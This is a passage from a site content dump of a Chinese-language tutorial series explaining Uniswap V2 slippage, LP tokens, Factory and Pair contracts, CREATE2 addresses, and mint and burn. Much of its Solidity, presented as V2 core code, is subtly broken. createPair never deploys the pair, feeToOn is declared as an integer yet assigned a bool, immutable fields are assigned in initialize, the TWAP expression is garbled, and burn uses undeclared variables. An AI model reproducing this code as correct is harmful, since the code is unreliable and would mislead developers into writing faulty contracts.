2000 USDC&quot;]\n        P5[&quot;实际价格: 1 ETH = 1818 USDC&quot;]\n        P6[&quot;滑点: 9.1%&quot;]\n    end\n\n    style P6 fill:#ffcdd2\n\n4.2 滑点计算\n滑点公式：\n滑点 = |预期价格 - 实际价格| / 预期价格 × 100%\n\n滑点的影响因素：\n\n交易规模 - 交易量越大，滑点越大\n池子深度 - 储备越多，滑点越小\n储备比例 - 储备比例越均衡，滑点越小\n\n4.3 滑点保护代码\nfunction swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes calldata data\n) external {\n    // ... 省略部分代码\n \n    // 滑点保护\n    require(amount0Out &gt; 0 || amount1Out &gt; 0, &quot;Insufficient output amount&quot;);\n \n    if (amount0Out == 0) {\n        uint256 amount1In = msg.value;\n        require(\n            getAmountOut(amount1In, reserve1, reserve0) &gt;= amount1Out,\n            &quot;UniswapV2: INSUFFICIENT_LIQUIDITY&quot;\n        );\n    }\n}\n\n5. 流动性提供机制\n5.1 LP(流动性提供者)角色\nLP向池子提供两种代币，获得LP代币作为凭证：\nflowchart LR\n    A[&quot;LP提供者&quot;] --&gt; B[&quot;存入Token0&quot;]\n    A --&gt; C[&quot;存入Token1&quot;]\n    B --&gt; D[&quot;获得LP代币&quot;]\n    C --&gt; D\n    D --&gt; E[&quot;按份额分享手续费&quot;]\n\n5.2 LP代币计算\nLP代币数量：\namountLP = min(amount0 / reserve0, amount1 / reserve1) × totalSupply\n\n计算逻辑：\n\n分别计算两种代币的占比\n取较小的占比（按比例最小的为准）\n乘以当前LP总供应量\n\n5.3 代码示例\nfunction mint(address to) external lock returns (uint256 liquidity) {\n    (uint112 reserve0, uint112 reserve1, ) = getReserves();\n    uint256 balance0 = IERC20(token0).balanceOf(address(this));\n    uint256 balance1 = IERC20(token1).balanceOf(address(this));\n \n    uint256 amount0 = balance0 - reserve0;\n    uint256 amount1 = balance1 - reserve1;\n \n    uint256 _totalSupply = totalSupply;\n \n    if (_totalSupply == 0) {\n        // 首次提供流动性\n        liquidity = sqrt(amount0 * amount1) - MINIMUM_LIQUIDITY;\n    } else {\n        // 追加流动性\n        liquidity = min(\n            amount0 * _totalSupply / reserve0,\n            amount1 * _totalSupply / reserve1\n        );\n    }\n \n    require(liquidity &gt; 0, &quot;Insufficient liquidity minted&quot;);\n \n    _mint(to, liquidity);\n \n    emit Mint(msg.sender, to, amount0, amount1, liquidity);\n}\n\n6. V2核心特性\n6.1 ERC20/ERC20交易\nV2最大的创新是支持任意两个ERC20代币的直接交易：\ngraph TB\n    subgraph V1Mode[&quot;V1模式&quot;]\n        V1A[&quot;ETH必须参与&quot;]\n        V1B[&quot;ETH/TokenA&quot;]\n        V1C[&quot;ETH/TokenB&quot;]\n    end\n\n    subgraph V2Mode[&quot;V2模式&quot;]\n        V2A[&quot;任意ERC20配对&quot;]\n        V2B[&quot;TokenA/TokenB&quot;]\n        V2C[&quot;TokenC/TokenD&quot;]\n    end\n\n    V1B -.-&gt;|需要两笔交易| V2B\n    V1C -.-&gt;|需要两笔交易| V2B\n\n    style V2B fill:#c8e6c9\n\n6.2 Flash Swap\nFlash Swap允许用户无需抵押借出代币进行套利：\nsequenceDiagram\n    participant U as User\n    participant P as Pair合约\n    participant T as 目标合约\n\n    U-&gt;&gt;P: flashSwap(借100 Token0)\n    P-&gt;&gt;U: 转账100 Token0\n    U-&gt;&gt;T: 执行套利逻辑\n    T-&gt;&gt;P: 归还101 Token0\n    P-&gt;&gt;P: 验证：归还 &gt;= 借出 + 费用\n\nFlash Swap条件：\n\n在同一个交易内完成\n归还数量 &gt;= 借出数量 + 0.3%费用\n失败则整个交易回滚\n\n6.3 TWAP预言机\nV2内置**时间加权平均价格(TWAP)**预言机：\n// 累积价格\nuint256 public price0CumulativeLast;\nuint256 public price1CumulativeLast;\n \n// 更新预言机\nfunction _update(\n    uint256 balance0,\n    uint256 balance1\n) private {\n    uint32 timeElapsed = block.timestamp - blockTimestampLast;\n \n    if (timeElapsed &gt; 0) {\n        uint256 price0 = (reserve1 * 1e18) / reserve0;\n        uint256 price1 = (reserve0 * 1e18) / reserve1;\n \n        price0CumulativeLast += price0 * timeElapsed;\n        price1CumulativeLast += price1 * timeElapsed;\n    }\n}\n\n7. V2 vs V1/V3对比\n7.1 功能对比\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性V1V2V3交易对ETH/ERC20ERC20/ERC20ERC20/ERC20流动性均匀分布均匀分布可集中费用0.3%0.3%0.01%-1%LP代币ERC20ERC20ERC721Flash Swap❌✅✅预言机❌TWAPTWAP创建池简单简单复杂\n7.2 适用场景\nUniswap V2 适合：\n\n标准 ERC20 代币对\n无需复杂价格管理的场景\n需要简单可靠的价格预言机\nFlash Swap 套利策略\n\nUniswap V3 更适合：\n\n需要资本效率的场景\n稳定币对（窄区间）\n需要多级费率\n专业做市商\n\n\n8. 本章小结\n8.1 核心概念总结\nmindmap\n  root((V2核心))\n    恒定乘积\n      x × y = k\n      自动定价\n      无需订单簿\n    ERC20/ERC20\n      任意代币配对\n      无需ETH中转\n      灵活交易\n    Flash Swap\n      无抵押借贷\n      原子化套利\n      单交易完成\n    TWAP预言机\n      时间加权平均\n      可靠价格源\n      链上可验证\n\n8.2 关键公式回顾\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n公式含义x × y = k恒定乘积P = y/x相对价格Δy = y × Δx / (x + Δx)输出计算滑点 = |预期-实际|/预期滑点计算\n\n下一篇预告\n在下一篇文章中，我们将深入探讨Factory与Pair合约，包括：\n\nFactory合约的职责与实现\nPair合约的创建流程\n储备量管理机制\n事件日志设计\n\n\n参考资料\n\nUniswap V2 白皮书\nUniswap V2 Core 源码\nERC-20 Token Standard\n"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/02-Factory与Pair合约":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/02-Factory与Pair合约","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/02-Factory与Pair合约.md","title":"02-Factory与Pair合约","links":[],"tags":[],"content":"死磕Uniswap V2（二）：Factory与Pair合约\n\n本文是「死磕Uniswap V2」系列的第二篇，深入剖析V2的Factory和Pair核心合约架构。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V2概述与核心原理恒定乘积AMM、核心公式02Factory与Pair合约合约结构、创建流程03流动性与LP代币mint/burn、份额计算04交换机制深度解析swap函数、滑点、Flash Swap05价格预言机TWAP、价格计算06Router与路由最佳路径、多跳交易07安全实践与最佳实践漏洞防护、开发建议\n\n1. 合约架构概览\n1.1 V2核心合约\ngraph TB\n    subgraph V2Core[&quot;V2核心合约&quot;]\n        F[UniswapV2Factory&lt;br/&gt;工厂合约]\n        P1[Pair ETH/USDC&lt;br/&gt;交易对合约]\n        P2[Pair USDC/USDT&lt;br/&gt;交易对合约]\n        P3[Pair WBTC/ETH&lt;br/&gt;交易对合约]\n        PN[Pair ...&lt;br/&gt;更多交易对]\n    end\n\n    F --&gt; P1\n    F --&gt; P2\n    F --&gt; P3\n    F --&gt; PN\n\n    style F fill:#e3f2fd\n\n1.2 合约职责划分\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n合约职责主要功能Factory交易对工厂创建Pair、管理注册表Pair交易对合约存储储备、执行swap、LP管理Router路由合约多跳交易、最佳路径\n\n2. Factory合约详解\n2.1 合约概览\nFactory是工厂合约，负责创建和管理所有交易对(Pair)。\ncontract UniswapV2Factory is IUniswapV2Factory {\n    /// @notice 已创建的Pair地址映射\n    mapping(address =&gt; mapping(address =&gt; address)) public getPair;\n \n    /// @notice 所有Pair地址列表\n    address[] public allPairs;\n \n    /// @notice 创建Pair时的手续费开关\n    uint256 public feeTo;  // 转开关手续费地址\n    uint256 public feeToOn;  // 开关状态\n \n    address public immutable feeToSetter;\n}\n2.2 核心功能\ncreatePair - 创建交易对\nfunction createPair(\n    address tokenA,\n    address tokenB\n) external returns (address pair) {\n    // 1. 确保代币地址不同\n    require(tokenA != tokenB, &quot;UniswapV2: IDENTICAL_ADDRESSES&quot;);\n \n    // 2. 排序token地址（确保一致性）\n    (address token0, address token1) = tokenA &lt; tokenB\n        ? (tokenA, tokenB)\n        : (tokenB, tokenA);\n \n    // 3. 检查Pair是否已存在\n    require(getPair[token0][token1] == address(0), &quot;UniswapV2: PAIR_EXISTS&quot;);\n \n    // 4. 计算Pair地址（CREATE2确定性）\n    bytes32 salt = keccak256(abi.encodePacked(token0, token1));\n    pair = address(uint160(uint256(keccak256(\n        abi.encodePacked(\n            byte(0xff),\n            address(this),\n            keccak256(abi.encodePacked(type(UniswapV2Pair).creationCode)),\n            salt\n        )))));\n \n    // 5. 部署Pair合约\n    IUniswapV2Pair(pair).initialize(token0, token1);\n \n    // 6. 注册Pair\n    getPair[token0][token1] = pair;\n    getPair[token1][token0] = pair;\n    allPairs.push(pair);\n \n    emit PairCreated(token0, token1, pair, allPairs.length);\n}\nCREATE2地址计算：\nflowchart LR\n    A[token0, token1] --&gt; B[keccak256编码]\n    B --&gt; C[作为salt]\n    C --&gt; D[CREATE2部署]\n    D --&gt; E[确定性地址]\n\nsetFeeTo - 设置手续费接收\nfunction setFeeTo(address _feeTo) external {\n    require(msg.sender == feeToSetter, &quot;UniswapV2: FORBIDDEN&quot;);\n    feeTo = _feeTo;\n    emit SetFeeTo(_feeTo);\n}\nsetFeeToOn - 开启手续费开关\nfunction setFeeToOn(bool _feeToOn) external {\n    require(msg.sender == feeToSetter, &quot;UniswapV2: FORBIDDEN&quot;);\n    feeToOn = _feeToOn;\n    emit SetFeeToOn(_feeToOn);\n}\n2.3 事件定义\nevent PairCreated(\n    address indexed token0,\n    address indexed token1,\n    address pair,\n    uint256 allPairsLength\n);\n \nevent SetFeeTo(address indexed feeTo);\nevent SetFeeToOn(bool feeToOn);\n\n3. Pair合约详解\n3.1 合约结构\ncontract UniswapV2Pair is IUniswapV2Pair, UniswapV2ERC20 {\n    /// @notice 恒定乘积储备\n    uint112 public reserve0;\n    uint112 public reserve1;\n \n    /// @notice 时间戳（用于TWAP）\n    uint32 public blockTimestampLast;\n \n    /// @notice 累积价格（用于TWAP）\n    uint256 public price0CumulativeLast;\n    uint256 public price1CumulativeLast;\n \n    /// @notice 代币地址\n    address public immutable token0;\n    address public immutable token1;\n \n    /// @notice 工厂地址\n    address public immutable factory;\n \n    /// @notice k值\n    uint256 private constant MINIMUM_LIQUIDITY = 1000;\n}\n3.2 初始化函数\nfunction initialize(\n    address _token0,\n    address _token1\n) external {\n    require(msg.sender == factory, &quot;UniswapV2: FORBIDDEN&quot;);\n \n    // 确保未初始化\n    require(token0 == address(0) &amp;&amp; token1 == address(0), &quot;UniswapV2: FORBIDDEN&quot;);\n \n    token0 = _token0;\n    token1 = _token1;\n \n    emit PairInitialized(_token0, _token1);\n}\n3.3 储备量管理\nfunction _update(\n    uint256 balance0,\n    uint256 balance1\n) private {\n    // 1. 记录当前累积价格\n    uint32 blockTimestamp = uint32(block.timestamp % 2**32);\n    uint32 timeElapsed = blockTimestamp - blockTimestampLast;\n \n    if (timeElapsed &gt; 0 &amp;&amp; reserve0 &gt; 0 &amp;&amp; reserve1 &gt; 0) {\n        // 更新累积价格\n        price0CumulativeLast += uint256(\n            FixedPoint128.encode(uint112(reserve1).x 64) / uint112(reserve0)\n        ) * timeElapsed;\n \n        price1CumulativeLast += uint256(\n            FixedPoint128.encode(uint112(reserve0).x 64) / uint112(reserve1)\n        ) * timeElapsed;\n    }\n \n    // 2. 更新储备量\n    reserve0 = uint112(balance0);\n    reserve1 = uint112(balance1);\n    blockTimestampLast = blockTimestamp;\n \n    emit Sync(reserve0, reserve1);\n}\n3.4 数据结构\nclassDiagram\n    class UniswapV2Pair {\n        +uint112 reserve0\n        +uint112 reserve1\n        +uint32 blockTimestampLast\n        +uint256 price0CumulativeLast\n        +uint256 price1CumulativeLast\n        +address token0\n        +address token1\n        +address factory\n        +uint256 totalSupply\n        initialize(address,address)\n        getReserves() (uint112,uint112,uint32)\n        mint(address) uint256\n        burn(address) (uint256,uint256)\n        swap(uint256,uint256,address,bytes)\n        skim(address,address)\n    }\n\n\n4. Pair创建流程\n4.1 完整流程图\nsequenceDiagram\n    participant U as User\n    participant F as Factory\n    participant P as Pair\n    participant T0 as Token0\n    participant T1 as Token1\n\n    U-&gt;&gt;F: createPair(tokenA, tokenB)\n    F-&gt;&gt;F: 排序token地址\n    F-&gt;&gt;F: 检查是否已存在\n    F-&gt;&gt;F: 计算CREATE2地址\n    F-&gt;&gt;P: CREATE2 部署Pair\n    P-&gt;&gt;F: initialize(token0, token1)\n    P-&gt;&gt;T0: 检查ERC20兼容性\n    P-&gt;&gt;T1: 检查ERC20兼容性\n    F-&gt;&gt;U: 返回pair地址\n\n4.2 代码流程详解\n// 用户调用示例\nfunction createNewPair(\n    address tokenA,  // USDC\n    address tokenB   // USDT\n) external returns (address pair) {\n    // 1. 获取Factory地址\n    address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;\n \n    // 2. 调用createPair\n    pair = IUniswapV2Factory(factory).createPair(tokenA, tokenB);\n}\n4.3 Pair地址计算\nCREATE2公式：\naddress = keccak256(\n    0xff +\n    sender_address +\n    keccak256(init_code) +\n    salt\n) mod 2^160\n\nV2的实现：\n\nsender: Factory合约地址\ninit_code: Pair合约的创建代码\nsalt: keccak256(abi.encodePacked(token0, token1))\n\n代码验证：\nfunction calculatePairAddress(\n    address factory,\n    address token0,\n    address token1\n) public pure returns (address pair) {\n    // 排序\n    if (token0 &gt; token1) {\n        (token0, token1) = (token1, token0);\n    }\n \n    // 计算salt\n    bytes32 salt = keccak256(abi.encodePacked(token0, token1));\n \n    // 计算地址\n    bytes32 hash = keccak256(\n        abi.encodePacked(\n            byte(0xff),\n            factory,\n            keccak256(abi.encodePacked(\n                type(UniswapV2Pair).creationCode\n            )),\n            salt\n        )\n    );\n \n    return address(uint160(uint256(hash)));\n}\n\n5. 合约交互流程\n5.1 Factory与Pair关系\ngraph TB\n    subgraph User[&quot;用户操作&quot;]\n        U1[创建交易对]\n        U2[添加流动性]\n        U3[执行swap]\n    end\n\n    subgraph Factory[&quot;Factory合约&quot;]\n        F1[createPair]\n        F2[getPair]\n    end\n\n    subgraph Pair[&quot;Pair合约&quot;]\n        P1[initialize]\n        P2[mint/burn]\n        P3[swap]\n    end\n\n    U1 --&gt; F1 --&gt; P1\n    U2 --&gt; F2 --&gt; P2\n    U3 --&gt; F2 --&gt; P3\n\n    style F1 fill:#e3f2fd\n    style F2 fill:#e3f2fd\n\n5.2 查询Pair地址\nfunction getPairAddress(\n    address factory,\n    address tokenA,\n    address tokenB\n) external view returns (address) {\n    return IUniswapV2Factory(factory).getPair(tokenA, tokenB);\n}\n \n// 或直接调用接口\nfunction getPairAddress(\n    address factory,\n    address tokenA,\n    address tokenB\n) external pure returns (address) {\n    (address token0, address token1) = tokenA &lt; tokenB\n        ? (tokenA, tokenB)\n        : (tokenB, tokenA);\n \n    bytes32 salt = keccak256(abi.encodePacked(token0, token1));\n    bytes32 hash = keccak256(\n        abi.encodePacked(\n            byte(0xff),\n            factory,\n            keccak256(abi.encodePacked(\n                type(UniswapV2Pair).creationCode\n            )),\n            salt\n        )\n    );\n \n    return address(uint160(uint256(hash)));\n}\n\n6. 合约安全机制\n6.1 访问控制\n// 仅Factory可调用\nmodifier onlyFactory() {\n    require(msg.sender == factory, &quot;UniswapV2: FORBIDDEN&quot;);\n    _;\n}\n \n// 在initialize中使用\nfunction initialize(address _token0, address _token1) external onlyFactory {\n    // ...\n}\n6.2 状态一致性\n// 确保Pair只初始化一次\nrequire(token0 == address(0) &amp;&amp; token1 == address(0), &quot;UniswapV2: FORBIDDEN&quot;);\n \n// 使用锁机制\nuint256 private unlocked = 1;\n \nmodifier lock() {\n    require(unlocked == 1, &quot;LOCKED&quot;);\n    unlocked = 0;\n    _;\n    unlocked = 1;\n}\n6.3 重入保护\nstateDiagram-v2\n    [*] --&gt; Unlocked: 初始状态\n    Unlocked --&gt; Locked: lock()调用\n    Locked --&gt; Unlocked: 执行完成\n\n    note right of Locked\n        unlocked = 0\n        拒绝重入\n    end note\n\n    note right of Unlocked\n        unlocked = 1\n        接受新操作\n    end note\n\n\n7. 实战示例\n7.1 创建交易对\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n \nimport &quot;@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol&quot;;\n \ncontract PairCreator {\n    IUniswapV2Factory public immutable factory;\n \n    constructor(address _factory) {\n        factory = IUniswapV2Factory(_factory);\n    }\n \n    function createAndInitPair(\n        address tokenA,\n        address tokenB\n    ) external returns (address pair) {\n        // 创建Pair\n        pair = factory.createPair(tokenA, tokenB);\n \n        emit PairCreated(tokenA, tokenB, pair);\n    }\n \n    function getPairAddress(\n        address tokenA,\n        address tokenB\n    ) external view returns (address) {\n        return factory.getPair(tokenA, tokenB);\n    }\n}\n7.2 查询所有Pair\nfunction getAllPairs(\n    address factory\n) external view returns (address[] memory) {\n    uint256 length = IUniswapV2Factory(factory).allPairsLength();\n    address[] memory pairs = new address[](length);\n \n    for (uint256 i = 0; i &lt; length; i++) {\n        pairs[i] = IUniswapV2Factory(factory).allPairs(i);\n    }\n \n    return pairs;\n}\n\n8. 本章小结\n8.1 合约架构总结\nmindmap\n  root((V2合约架构))\n    Factory\n      创建Pair\n      管理注册表\n      控制手续费\n    Pair\n      存储储备\n      执行swap\n      LP代币管理\n      更新预言机\n    Router\n      多跳交易\n      最佳路径\n      闪电兑换\n\n8.2 关键函数回顾\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n合约函数功能FactorycreatePair()创建交易对FactorygetPair()查询Pair地址FactorysetFeeTo()设置手续费接收Pairinitialize()初始化交易对PairgetReserves()获取储备量Pair_update()更新储备和预言机\n\n下一篇预告\n在下一篇文章中，我们将深入探讨流动性与LP代币，包括：\n\nmint/burn函数详解\nLP份额计算机制\n流动性提供与移除\n手续费分配机制\n\n\n参考资料\n\nUniswap V2 Core - UniswapV2Factory.sol\nUniswap V2 Core - UniswapV2Pair.sol\nCREATE2 Deterministic Deployment\n"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/03-流动性与LP代币":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/03-流动性与LP代币","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/03-流动性与LP代币.md","title":"03-流动性与LP代币","links":[],"tags":[],"content":"死磕Uniswap V2（三）：流动性与LP代币\n\n本文是「死磕Uniswap V2」系列的第三篇，深入剖析V2的流动性提供机制和LP代币系统。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V2概述与核心原理恒定乘积AMM、核心公式02Factory与Pair合约合约结构、创建流程03流动性与LP代币mint/burn、份额计算04交换机制深度解析swap函数、滑点、Flash Swap05价格预言机TWAP、价格计算06Router与路由最佳路径、多跳交易07安全实践与最佳实践漏洞防护、开发建议\n\n1. 流动性提供概述\n1.1 什么是LP(流动性提供者)？\n**LP(Liquidity Provider)**向交易对池子提供两种代币，获得LP代币作为凭证，并按份额分享交易手续费。\nflowchart LR\n    A[&quot;LP提供者&quot;] --&gt; B[&quot;存入Token0&quot;]\n    A --&gt; C[&quot;存入Token1&quot;]\n    B --&gt; D[&quot;获得LP代币&quot;]\n    C --&gt; D\n    D --&gt; E[&quot;分享交易手续费&quot;]\n\n1.2 流动性提供流程\nstateDiagram-v2\n    [*] --&gt; 准备代币: 持有Token0和Token1\n    准备代币 --&gt; 授权Pair: approve转账\n    授权Pair --&gt; 调用mint: 存入代币\n    调用mint --&gt; 持有LP: 获得LP代币\n    持有LP --&gt; 赚取手续费: 按份额分配\n    持有LP --&gt; 调用burn: 移除流动性\n    调用burn --&gt; [*]: 收回代币\n\n    note right of 赚取手续费\n        每笔交易自动累积\n        LP代币价值增加\n    end note\n\n\n2. LP代币详解\n2.1 UniswapV2ERC20标准\nV2的LP代币基于ERC20标准实现：\ncontract UniswapV2ERC20 is IUniswapV2ERC20 {\n    string public constant name = &quot;Uniswap V2&quot;;\n    string public constant symbol = &quot;UNI-V2&quot;;\n    uint8 public constant decimals = 18;\n \n    /// @notice 总供应量\n    uint256 public totalSupply;\n \n    /// @notice 余额映射\n    mapping(address =&gt; uint256) public balanceOf;\n \n    /// @notice 授权映射\n    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;\n}\n2.2 LP代币与份额的关系\n核心公式：\nLP份额 = √(x0 × y0)\n\n其中：\n\nx0: 初始Token0数量\ny0: 初始Token1数量\n\n追加流动性：\n新份额 = min(Δx/x0, Δy/y0) × 总份额\n\n\n3. mint函数详解\n3.1 mint流程图\nflowchart TD\n    A[&quot;用户调用mint&quot;] --&gt; B{检查授权}\n    B --&gt;|未授权| C[&quot;revert&quot;]\n    B --&gt;|已授权| D[&quot;计算代币余额&quot;]\n    D --&gt; E[&quot;计算存入数量&lt;br/&gt;amount0, amount1&quot;]\n    E --&gt; F{检查数量}\n    F --&gt;|任一为0| G[&quot;revert&quot;]\n    F --&gt;|都&gt;0| H{&quot;总供应量==0?&quot;}\n    H --&gt;|是| I[&quot;首次mint&lt;br/&gt;份额=√(amount0×amount1)&quot;]\n    H --&gt;|否| J[&quot;追加mint&lt;br/&gt;份额=min(amount0/reserve0, amount1/reserve1)×总供应量&quot;]\n    I --&gt; K[&quot;铸造LP代币&quot;]\n    J --&gt; K\n    K --&gt; L[&quot;更新储备量&quot;]\n    L --&gt; M[&quot;触发Sync事件&quot;]\n\n3.2 mint函数代码\nfunction mint(address to) external lock returns (uint256 liquidity) {\n    // 1. 获取当前储备量\n    (uint112 reserve0, uint112 reserve1, ) = getReserves();\n \n    // 2. 获取代币余额\n    uint256 balance0 = IERC20(token0).balanceOf(address(this));\n    uint256 balance1 = IERC20(token1).balanceOf(address(this));\n \n    // 3. 计算存入数量\n    uint256 amount0 = balance0 - reserve0;\n    uint256 amount1 = balance1 - reserve1;\n \n    // 4. 计算LP份额\n    uint256 _totalSupply = totalSupply;\n    if (_totalSupply == 0) {\n        // 首次提供流动性\n        liquidity = sqrt(amount0 * amount1) - MINIMUM_LIQUIDITY;\n        _mint(address(0), MINIMUM_LIQUIDITY); // 永久锁定最小流动性\n    } else {\n        // 追加流动性\n        liquidity = min(\n            amount0 * _totalSupply / reserve0,\n            amount1 * _totalSupply / reserve1\n        );\n    }\n \n    require(liquidity &gt; 0, &quot;UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED&quot;);\n \n    // 5. 铸造LP代币给接收者\n    _mint(to, liquidity);\n \n    // 6. 更新储备量\n    _update(balance0, balance1);\n \n    emit Mint(msg.sender, to, amount0, amount1, liquidity);\n}\n3.3 首次mint示例\n场景： 创建USDC/USDT池子\nflowchart LR\n    A[&quot;初始状态&lt;br/&gt;balance0=0&lt;br/&gt;balance1=0&quot;] --&gt; B[&quot;存入1,000,000 USDC&lt;br/&gt;存入1,000,000 USDT&quot;]\n    B --&gt; C[&quot;计算LP份额&lt;br/&gt;liquidity = √(1e6 × 1e6) - 1000&quot;]\n    C --&gt; D[&quot;铸造LP代币&lt;br/&gt;≈ 999,999 LP&quot;]\n    D --&gt; E[&quot;用户持有999,999 LP&lt;br/&gt;系统持有1000 LP&quot;]\n\n代码示例：\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n \nimport &quot;@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol&quot;;\n \ncontract LiquidityProvider {\n    IUniswapV2Router01 public immutable router;\n \n    function provideLiquidity(\n        address pair,\n        uint256 amount0Desired,\n        uint256 amount1Desired\n    ) external {\n        // 1. 授权Pair合约\n        IERC20(IUniswapV2Pair(pair).token0()).approve(pair, type(uint256).max);\n        IERC20(IUniswapV2Pair(pair).token1()).approve(pair, type(uint256).max);\n \n        // 2. 转账代币到Pair\n        IERC20(IUniswapV2Pair(pair).token0()).transferFrom(\n            msg.sender,\n            pair,\n            amount0Desired\n        );\n        IERC20(IUniswapV2Pair(pair).token1()).transferFrom(\n            msg.sender,\n            pair,\n            amount1Desired\n        );\n \n        // 3. 调用mint\n        IUniswapV2Pair(pair).mint(msg.sender);\n    }\n}\n\n4. burn函数详解\n4.1 burn流程图\nflowchart TD\n    A[&quot;用户调用burn&quot;] --&gt; B[&quot;验证LP余额&quot;]\n    B --&gt; C[&quot;计算销毁份额&quot;]\n    C --&gt; D[&quot;计算应得代币&quot;]\n    D --&gt; E[&quot;计算储备比例&lt;br/&gt;reserve0/总供应量&lt;br/&gt;reserve1/总供应量&quot;]\n    E --&gt; F[&quot;计算用户应得&lt;br/&gt;amount0 = liquidity × reserve0 / 总供应量&lt;br/&gt;amount1 = liquidity × reserve1 / 总供应量&quot;]\n    F --&gt; G[&quot;销毁LP代币&quot;]\n    G --&gt; H[&quot;转出代币给用户&quot;]\n    H --&gt; I[&quot;更新储备量&quot;]\n\n4.2 burn函数代码\nfunction burn(address to) external lock returns (\n    uint256 amount0,\n    uint256 amount1\n) {\n    // 1. 获取用户LP余额\n    uint256 liquidity = balanceOf[address(this)];\n \n    // 2. 获取当前储备量\n    (uint112 reserve0, uint112 reserve1, ) = getReserves();\n    require(\n        reserve0 &gt; 0 &amp;&amp; reserve1 &gt; 0,\n        &quot;UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED&quot;\n    );\n \n    // 3. 计算用户应得代币\n    uint256 _totalSupply = totalSupply;\n \n    // amount0 = 用户份额 × Token0储备 / 总份额\n    amount0 = liquidity * reserve0 / _totalSupply;\n \n    // amount1 = 用户份额 × Token1储备 / 总份额\n    amount1 = liquidity * reserve1 / _totalSupply;\n \n    // 4. 销毁LP代币\n    _burn(address(this), liquidity);\n \n    // 5. 转出代币给接收者\n    if (amount0 &gt; 0) {\n        IERC20(token0).transfer(to, amount0);\n    }\n    if (amount1 &gt; 0) {\n        IERC20(token1).transfer(to, amount1);\n    }\n \n    // 6. 更新储备量\n    (balance0, balance1, ) = getReserves();\n    _update(balance0 - amount0, balance1 - amount1);\n \n    emit Burn(msg.sender, to, amount0, amount1);\n}\n4.3 流动性移除示例\nflowchart LR\n    subgraph Before[&quot;移除前&quot;]\n        R0[&quot;储备: 1000 ETH&lt;br/&gt;200,000 USDC&quot;]\n        LP[&quot;用户LP: 10,000 LP&lt;br/&gt;总供应: 100,000 LP&quot;]\n    end\n\n    subgraph Calculation[&quot;计算&quot;]\n        F1[&quot;ETH应得 = 10,000 × 1000 / 100,000&lt;br/&gt;= 100 ETH&quot;]\n        F2[&quot;USDC应得 = 10,000 × 200,000 / 100,000&lt;br/&gt;= 20,000 USDC&quot;]\n    end\n\n    subgraph After[&quot;移除后&quot;]\n        R1[&quot;储备: 900 ETH&lt;br/&gt;180,000 USDC&quot;]\n        User[&quot;用户收到: 100 ETH&lt;br/&gt;20,000 USDC&quot;]\n    end\n\n    Before --&gt; Calculation\n    Calculation --&gt; After\n\n    style User fill:#c8e6c9\n\n\n5. 流动性份额计算\n5.1 首次提供流动性\nfunction calculateInitialLiquidity(\n    uint256 amount0,\n    uint256 amount1\n) public pure returns (uint256 liquidity) {\n    if (amount0 == 0 || amount1 == 0) {\n        return 0;\n    }\n \n    // 几何平均数减去最小流动性\n    uint256 sqrt = sqrt(amount0 * amount1);\n    liquidity = sqrt - MINIMUM_LIQUIDITY;\n \n    return liquidity;\n}\n示例计算：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n输入amount0amount1计算结果USDC/USDT1,000,0001,000,000√(1e12) - 1000 ≈ 999,999ETH/USDC10 ETH20,000 USDC√(2e23) - 1000 ≈ 447,213\n5.2 追加流动性\nfunction calculateAdditionalLiquidity(\n    uint256 reserve0,\n    uint256 reserve1,\n    uint256 totalSupply,\n    uint256 amount0,\n    uint256 amount1\n) public pure returns (uint256 liquidity) {\n    // 按比例计算\n    uint256 liquidity0 = amount0 * totalSupply / reserve0;\n    uint256 liquidity1 = amount1 * totalSupply / reserve1;\n \n    // 取较小值（按比例最小的为准）\n    liquidity = min(liquidity0, liquidity1);\n \n    return liquidity;\n}\n示例计算：\nflowchart TD\n    A[&quot;当前储备&lt;br/&gt;reserve0=1000&lt;br/&gt;reserve1=200000&lt;br/&gt;总供应=100000&quot;] --&gt; B[&quot;用户提供&lt;br/&gt;100 ETH + 20000 USDC&quot;]\n    B --&gt; C[&quot;计算份额&quot;]\n    C --&gt; D[&quot;liquidity0 = 100 × 100000 / 1000&lt;br/&gt;= 10,000&quot;]\n    C --&gt; E[&quot;liquidity1 = 20000 × 100000 / 200000&lt;br/&gt;= 10,000&quot;]\n    D --&gt; F[&quot;取较小值: 10,000&quot;]\n    E --&gt; F\n\n\n6. 手续费机制\n6.1 手续费分配\ngraph TB\n    subgraph FeeFlow[&quot;手续费流向&quot;]\n        S[交易者] --&gt;|0.3%| P[Pair池子]\n        P --&gt; LP[LP持有者]\n        P --&gt; F[协议费用&lt;br/&gt;可选]\n    end\n\n    style LP fill:#c8e6c9\n\n6.2 手续费累积\nfunction _update(\n    uint256 balance0,\n    uint256 balance1\n) 